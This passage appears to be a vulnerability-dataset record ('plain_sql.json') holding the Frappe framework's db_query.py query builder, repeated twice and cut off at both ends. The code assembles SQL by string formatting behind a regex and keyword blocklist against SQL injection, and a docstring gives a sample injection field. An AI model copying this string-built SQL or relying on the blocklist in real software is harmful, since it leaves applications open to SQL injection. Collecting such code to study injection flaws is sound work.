order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',\n\t\t\t'from', 'group', 'order', 'by']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)\n\n\t\tdef _is_query(field):\n\t\t\tif re.compile(\"^(select|delete|update|drop|create)\\s\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\telif re.compile(\"\\s*[a-zA-z]*\\s*( from | group by | order by | where | join )\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\t_is_query(field)\n\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\tkwargs.pop('ignore_permissions', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kitechx/frappe/blob/1cb64cf06e5bd709024d52bdae1103bd26ae109d",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.client import check_parent_permission\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, 